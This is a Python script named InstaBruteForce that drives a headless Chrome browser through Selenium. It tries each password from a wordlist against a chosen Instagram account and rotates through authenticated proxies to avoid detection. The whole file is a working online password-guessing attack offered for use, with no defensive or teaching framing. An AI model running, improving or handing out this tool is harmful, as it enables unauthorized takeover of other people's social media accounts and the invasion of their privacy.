import selenium
from selenium import webdriver
from selenium.webdriver.common.by import By
from selenium.webdriver.support.ui import WebDriverWait
from selenium.webdriver.support import expected_conditions as EC
from selenium.webdriver.common.action_chains import ActionChains
import pyfiglet
from colorama import Fore, init
import time
import argparse

init(autoreset=True)

parser = argparse.ArgumentParser(description='InstaBruteForce Script')
parser.add_argument('--username', type=str, required=True, help='Instagram username Account')
parser.add_argument('--password_list', type=str, required=True, help='Password list file')
parser.add_argument('--proxies', type=str, required=False, help='Proxies file')
args = parser.parse_args()

toolName = pyfiglet.figlet_format("InstaBruteForce")
print(Fore.GREEN + toolName)
print(Fore.RED + "=" * 40 + "\n")
print(Fore.YELLOW + "Welcome to InstaBruteForce 🤖\n")
print(Fore.WHITE + f"💻 Developed by:{Fore.GREEN} @ioxEyad \n")
print(Fore.WHITE + f"🐙 Github User:{Fore.GREEN} @ioxEyad \n")
print(Fore.WHITE + f"🤖 Telegram Account:{Fore.GREEN} @eyademadx \n")
print(Fore.RED + "=" * 40 + "\n")

proxy_list = []
if args.proxies:
    with open(args.proxies, 'r') as f:
        proxy_list = f.read().splitlines()

def setup_driver(proxy=None):
    chrome_options = webdriver.ChromeOptions()
    chrome_options.add_argument("--headless=new")
    chrome_options.add_argument("--disable-gpu")
    chrome_options.add_argument("--window-size=1920x1080")
    chrome_options.add_argument("--no-sandbox")
    chrome_options.add_argument("--disable-dev-shm-usage")
    
    if proxy:
        proxy_host, proxy_port, proxy_user, proxy_pass = proxy.split(":")
        plugin_code = f"""
        var config = {{
            mode: "fixed_servers",
            rules: {{
                singleProxy: {{
                    scheme: "https",
                    host: "{proxy_host}",
                    port: parseInt({proxy_port})
                }},
                bypassList: ["localhost"]
            }}
        }};
        chrome.proxy.settings.set({{value: config, scope: "regular"}}, function() {{}});
        chrome.webRequest.onAuthRequired.addListener(
            function(details) {{
                return {{
                    authCredentials: {{
                        username: "{proxy_user}",
                        password: "{proxy_pass}"
                    }}
                }};
            }},
            {{urls: ["<all_urls>"]}},
            ["blocking"]
        );
        """
        with open("proxy_auth_plugin.js", "w") as f:
            f.write(plugin_code)
        chrome_options.add_argument("--load-extension=./proxy_auth_plugin.js")
    
    return webdriver.Chrome(options=chrome_options)

def brute_force():
    with open(args.password_list, 'r') as file:
        passwords = file.read().splitlines()
    
    for idx, password in enumerate(passwords):
        proxy = proxy_list[idx % len(proxy_list)] if proxy_list else None
        driver = setup_driver(proxy)
        print("[👾] Using This Proxy "+Fore.YELLOW + proxy)
        driver.get("https://www.instagram.com/accounts/login/")
        WebDriverWait(driver, 10).until(EC.visibility_of_element_located((By.NAME, "username")))
        
        username_input = driver.find_element(By.NAME, "username")
        password_input = driver.find_element(By.NAME, "password")
        submit_button = driver.find_element(By.CSS_SELECTOR, "button[type='submit']")
        
        username_input.send_keys(args.username)
        password_input.send_keys(password)
        submit_button.click()
        
        time.sleep(5)
        
        wrong = driver.find_elements(By.CLASS_NAME, "x1lliihq")
        if wrong:
            print(Fore.RED + f"[❌] Wrong Password: {password}")
        else:
            print(Fore.GREEN + f"[✅] Password Found: {password}")
            break
        
        driver.quit()
        time.sleep(2)

brute_force()
